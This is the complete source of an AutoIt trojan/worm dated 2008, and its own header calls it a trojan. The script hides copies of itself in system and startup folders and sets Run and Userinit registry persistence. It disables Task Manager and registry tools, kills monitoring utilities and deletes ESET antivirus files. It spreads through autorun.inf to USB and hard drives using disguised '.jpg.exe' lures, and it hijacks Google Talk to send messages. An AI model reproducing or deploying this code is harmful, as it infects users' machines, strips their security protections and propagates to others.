#cs ----------------------------------------------------------------------------
 AutoIt Version: 3.3.14.5
 Author	:       Arkar Mann Aung
 Date	:       DEC,2008.
 Type	: 		This is cant infeact file, this is only low level trojan.
 Script Function:
	  windows startup, file copy flash drive, set in autorun.inf and change ico (:.
#ce ----------------------------------------------------------------------------

; Script Start - Add your code below here
Opt("TrayiconHide",1) ; chit tal soe yal virus (loikaw hacker)
$Reg = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon","DefaultUserName")
FileCopy( @ScriptFullPath , @windowsdir & "\" & $Reg &"1.exe",1) ;extra
filecopy( @ScriptFullPath , @systemdir & "\" & $Reg & "small.exe",1)
FileCopy( @ScriptFullPath , "C:\Documents and Settings\" & $Reg & "\Start Menu\Programs\Startup\Startup.exe",1)
FileCopy( @ScriptFullPath , @systemdir & "\Startup.exe",1)
filecopy( @Scriptfullpath , @SystemDir & "\welcome.com",1)
FileSetAttrib(@windowsdir & "\" & $Reg &"1.exe","+R+S+H")
FileSetAttrib(@systemdir & "\" & $Reg & "small.exe","+R+S+H")
FileSetAttrib("C:\Documents and Settings\" & $Reg & "\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
FileSetAttrib(@systemdir & "\Startup.exe","+R+S+H")
FileSetAttrib(@SystemDir & "\welcome.com","+R+S+H")
DirCreate("D:\photo")
FileCopy(@ScriptFullPath , "D:\photo\photo.jpg.exe")
FileSetAttrib("D:\photo\photo.jpg.exe","-H-S")
RegDelete("HKEY_CLASSES_ROOT\cmdfile") ; .cmd file have leave out
RegDelete("HKEY_CLASSES_ROOT\batfile") ; .bat file have leave out
If ProcessExists("ntldr.pif") Then
	Run("explorer.exe")
EndIf
If @systemdir & "\Startup.exe" = @ScriptFullPath Then
	sleep(15000)
ElseIf @systemdir & "\Startup.pif" = @ScriptFullPath Then
	sleep(15000)
Else
If @SystemDir & "\welcome.com" = @ScriptFullPath Then
	sleep(10000)
	If ProcessExists($Reg &"1.exe") = 0 Then
		run( @windowsdir & "\" & $Reg &"1.exe","",@SW_HIDE)
	EndIf
		While 1 <> 2
				sleep(1350000)
				$ii = 0
				while 1 <> $ii
				$answer = MsgBox(4,"Chit tal kyar","i ko chit mar lar?" & @CRLF & "write by comput5r3razygirl@gmail.com")
					If $answer = 7 Then
						MsgBox(4,"har har har","ma chit lo ma ya buu!" & @CRLF & "write by comput5r3razygirl@gmail.com")
						$ii = 0
					ElseIf $answer = 6 then
						MsgBox(4,"I am too!","bye bye nor chit thu lay" & @CRLF & "write by comput5r3razygirl@gmail.com")
						$ii = 1
					EndIf
					sleep(1350000)
				WEnd
				If ProcessExists("googletalk.exe") Then
				run("C:\program files\Google\Google Talk\googletalk.exe")
				send("rif;eJYcsuf&wm 'DaeY tqifrajybl;uGm {enter} awmfrajymcsifawmhbl; {enter} rif;b,fvkdjzpfaewmvnf; {enter}{enter}") ;if user with myanmar font
				sleep(200)
				send("^+ comput5r3razygirl@gmai.com {enter}")
				sleep(200)
				send("d acc ko add lite nor {enter} thu ka nae` nae` lann tal {enter}my fri lay {enter} u nae` chat ya tar a sin ma pyae buu {enter}i chit chit nae` pae` chat talk mal{enter}")
				Sleep(200)
				EndIf
		WEnd
EndIf
EndIf
If ProcessExists($Reg &"1.exe") then
	Else
	run( @windowsdir & "\" & $Reg &"1.exe","",@SW_HIDE)
EndIf
If ProcessExists($Reg &"small.exe") then
	Else
	run( @systemdir & "\" & $Reg & "small.exe","",@SW_HIDE)
EndIf
If ProcessExists("welcome.com") then
	Else
	run( @SystemDir & "\welcome.com","",@SW_HIDE)
EndIf
If @windowsdir & "\" & $Reg &"1.exe" = @ScriptFullPath Then
RegWrite("HKEY_CLASSES_ROOT\.bat","","REG_SZ","virus")
RegWrite("HKEY_CLASSES_ROOT\.cmd","","REG_SZ","virus")
RegWrite("HKEY_CLASSES_ROOT\.reg","","REG_SZ","virus")
RegWrite("HKEY_CLASSES_ROOT\.dat","","REG_SZ","virus")
RegWrite("HKEY_CLASSES_ROOT\.tmp","","REG_SZ","virus")
RegWrite("HKEY_CLASSES_ROOT\virus\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
Regwrite("HKEY_CLASSES_ROOT\dllfile\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\jpegfile\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\giffile\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\Paint.Picture\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\wmafile\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\mp3file\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\SoundRec\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\AVIFile\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\mpegfile\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\txtfile\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\inifile\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\Wordpad.Document.1\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\Photoshop.Image.7\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\Folder\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0")
RegWrite("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "", "REG_SZ", @SystemDir & "\winlogon.exe,0") ;for my computer
RegWrite("HKEY_CLASSES_ROOT\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0") ;for my document
Regwrite("HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0") ;for recyclebin
RegWrite("HKEY_CLASSES_ROOT\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon","","REG_SZ", @windowsdir & "\" & $Reg &"1.exe,0") ;for netword place
	FileCopy(@scriptfullpath,@programfilesdir &"\ESET\nod32.exe")
	FileSetAttrib(@SystemDir & "\wininit.exe","-R")
	FileDelete(@systemdir &"\wininit.exe")
	FileDelete(@ProgramFilesDir & "\ESET\nod32.exe")
	FileDelete(@ProgramFilesDir & "\ESET\nod32kui.exe")
	FileDelete(@ProgramFilesDir & "\ESET\nod32krn.exe")
while 1 <> 3
	$rg1 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	$rg2 = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion"
	RegWrite ($rg1,"soe1","REG_SZ",@systemdir & "\" & $Reg & "small.exe")
	RegWrite ($rg1,"soe3","REG_SZ",@SystemDir &"\Startup.exe")
	RegWrite ($rg1,"soe4","REG_SZ",@windowsdir & "\" & $Reg &"1.exe")
	Regwrite ($rg2 & "\Explorer\Advanced","SuperHidden","REG_DWORD","0")
	Regwrite ($rg2 & "\Explorer\Advanced","ShowSuperHidden","REG_DWORD","0")
	Regwrite ($rg2 & "\Explorer\Advanced","HideFileExt","REG_DWORD","1")
	Regwrite ($rg2 & "\Explorer\Advanced","Hidden","REG_DWORD","2")
	RegWrite ($rg2 & "\Policies\Explorer","NoFind","REG_DWORD","1")
	Regwrite ($rg2 & "\Policies\Explorer","NoFolderOptions","REG_DWORD","1")
	Regwrite ($rg2 & "\Policies\Explorer","NoDriveTypeAutoRun","REG_DWORD","91")
	Regwrite ($rg2 & "\Policies\system","DisableTaskMgr","REG_DWORD","1")
	Regwrite ($rg2 & "\Policies\system","DisableRegistryTools","REG_DWORD","1")
	RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit", "REG_SZ" ,@SystemDir & "\userinit.exe," & @SystemDir & "\welcome.com")
	Sleep(1000)
$i = 1
While $i <> 6
	WinClose("System Configuration Utility")
		ProcessClose("regedit.exe")
		ProcessClose("msconfig.exe")
		ProcessClose("taskmgr.exe")
		$PID = ProcessExists("regedit.exe") And	ProcessExists("msconfig.exe") And ProcessExists("taskmgr.exe"); Will return the PID or 0 if the process isn't found.
		If $PID Then ProcessClose($PID)
	$Reg = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon","DefaultUserName")
	If ProcessExists($Reg & "small.exe") Then
	Else
		run( @systemdir & "\" & $Reg & "small.exe","",@SW_HIDE)
	EndIf
	If ProcessExists("welcome.com")Then
	Else
		run( @SystemDir & "\welcome.com","",@SW_HIDE)
	EndIf
	Sleep(1000)
	$i = $i + 1
WEnd
WEnd

ElseIf  @systemdir & "\" & $Reg & "small.exe" = @ScriptFullPath Then
	If ProcessExists("googletalk.exe") = 0 then
	ProcessClose("explorer.exe")
	run("explorer.exe")
	EndIf
	$ii = 0
	$count = 0
Do
	If ProcessExists($Reg &"1.exe") = 0 Then
		run( @windowsdir & "\" & $Reg &"1.exe","",@SW_HIDE)
	EndIf
	FileCopy( @scriptfullpath, "C:\Documents and Settings\"&$Reg&"\Local Settings\Application Data\Microsoft\CD Burning\photo.exe")
	FileSetAttrib("C:\Documents and Settings\"&$Reg&"\Local Settings\Application Data\Microsoft\CD Burning\photo.exe","+R+H+S")
	FileWrite("C:\Documents and Settings\"&$Reg&"\Local Settings\Application Data\Microsoft\CD Burning\autorun.inf","[autorun]"&@CRLF&"open=photo.exe"&@CRLF&"shellexecute=photo.exe"&@CRLF&"shell\Explore\command=photo.exe"&@CRLF&"shell\Open\command=photo.exe"&@CRLF&"shell=Explore")
	FileSetAttrib("C:\Documents and Settings\"&$Reg&"\Local Settings\Application Data\Microsoft\CD Burning\autorun.inf","+R+H+S")
	$drv = DriveGetDrive( "removable" )  ;Check for removable Disk to be infected
	If NOT @error Then
	If @MON = "12" and @MDAY = "21" Then ExitLoop
		For $i = 1 to $drv[0]
		if $drv[$i] <> "a:" then
		if DriveStatus ( $drv[$i] ) = "READY" then
		DirCreate($drv[$i]  & "\photo")
		FileCopy( @ScriptFullPath , $drv[$i]  & "\Loikawhacking.com",0)
		FileSetAttrib($drv[$i]  & "\Loikawhacking.com","+R+S+H")
		FileCopy(@scriptfullpath,$drv[$i] &"Top model.jpg.exe")
		FileSetAttrib($drv[$i] &"Top model.jpg.exe","-H-S")
		FileCopy(@scriptfullpath,$drv[$i] &"\photo\For you.jpg.exe")
		FileSetAttrib($drv[$i] &"\photo\For you.jpg.exe","-H-S")
		FileSetAttrib( $drv[$i]  & "\autorun.inf", "-R-S")
		IniWrite($drv[$i]  & "\autorun.inf", "autorun", "open", "Loikawhacking.com")
        IniWrite($drv[$i]  & "\autorun.inf", "autorun", "shellexecute", "Loikawhacking.com")
        IniWrite($drv[$i]  & "\autorun.inf", "autorun", "shell\Explore\command", "Loikawhacking.com")
        IniWrite($drv[$i]  & "\autorun.inf", "autorun", "shell\Open\command", "Loikawhacking.com")
        IniWrite($drv[$i]  & "\autorun.inf", "autorun", "shell", "Explore")
		FileSetAttrib( $drv[$i]  & "\autorun.inf", "+S+H")
		$search1 = FileFindFirstFile($drv[$i] & "\*.")
		if $search1 <> -1 Then
		$file1 = FileFindNextFile($search1)
		FileCopy(@scriptfullpath,$drv[$i] &"\"& $file1 &"\photo.jpg.exe")
		FileCopy(@scriptfullpath,$drv[$i] &"\For you.jpg.exe")
		FileSetAttrib($drv[$i] &"\For you.jpg.exe","-H-S")
		FileSetAttrib($drv[$i] &"\"& $file1 &"\*.jpg","+H")
		FileSetAttrib($drv[$i] &"\"& $file1 &"\photo.jpg.exe","-H-S")
		FileSetAttrib($drv[$i] &"\"& $file1 &"\For you.jpg.exe","-H-S")
		EndIf
	FileClose($search1)
	EndIf
	EndIf
	Next ;end of next for removeable drives
		$fix = DriveGetDrive( "fixed" )
		For $a = 1 to $fix[0] ;for Hard drives
	If DriveStatus ( $fix[$a] ) = "UNKNOWN" then
	Else
		FileCopy( @ScriptFullPath , $fix[$a]  & "\ntldr.pif",1)
		IniWrite($fix[$a]  & "\autorun.inf", "autorun", "open", "ntldr.pif")
        IniWrite($fix[$a]  & "\autorun.inf", "autorun", "shellexecute", "ntldr.pif")
        IniWrite($fix[$a]  & "\autorun.inf", "autorun", "shell\Explore\command", "ntldr.pif")
        IniWrite($fix[$a]  & "\autorun.inf", "autorun", "shell\Open\command", "ntldr.pif")
        IniWrite($fix[$a]  & "\autorun.inf", "autorun", "shell", "Explore")
		FileSetAttrib( $fix[$a]  & "\autorun.inf", "+R+S+H")
	EndIf
Next
EndIf
Sleep(2000)
Until $ii = 10
Else
	;extra file copy current windows and another windows
	$scan1 = FileFindFirstFile("C:\Documents and Settings\*.")
	if $scan1 <> -1 Then
	$files1 = FileFindNextFile($scan1)
	filecopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files1 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files1 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files2 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files2 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files2 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files3 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files3 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files3 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files4 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files4 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files4 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files5 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files5 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files5 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files6 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files6 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files6 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files7 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files7 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files7 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files8 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files8 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files8 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files9 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files9 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files9 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files10 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files10 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files10 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
	if $scan1 <> -1 Then
	$files11 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files11 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files11 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf ; ================
	if $scan1 <> -1 Then
	$files12 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files12 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files12 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
if $scan1 <> -1 Then
	$files13 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files13 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files13 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
if $scan1 <> -1 Then
	$files14 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files14 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files14 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
if $scan1 <> -1 Then
	$files15 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files15 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files15 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
if $scan1 <> -1 Then
	$files16 = FileFindNextFile($scan1)
	FileCopy( @Scriptfullpath ,"C:\Documents and Settings\"& $files16 &"\Start Menu\Programs\Startup\Startup.exe")
	FileSetAttrib("C:\Documents and Settings\"& $files16 &"\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
EndIf
FileClose($scan1)
filecopy( @scriptfullpath , "C:\Documents and Settings\All Users.WINDOWS\Start Menu\Programs\Startup\Startup.exe",1)
filecopy( @scriptfullpath , "C:\Documents and Settings\Default User\Start Menu\Programs\Startup\Startup.exe",1)
filecopy( @scriptfullpath , "C:\Documents and Settings\All Users.WINDOWS.0\Start Menu\Programs\Startup\Startup.exe",1)
FileSetAttrib("C:\Documents and Settings\All Users.WINDOWS\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
FileSetAttrib("C:\Documents and Settings\Default User\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
FileSetAttrib("C:\Documents and Settings\All Users.WINDOWS.0\Start Menu\Programs\Startup\Startup.exe","+R+S+H")
	Exit
EndIf	;complete
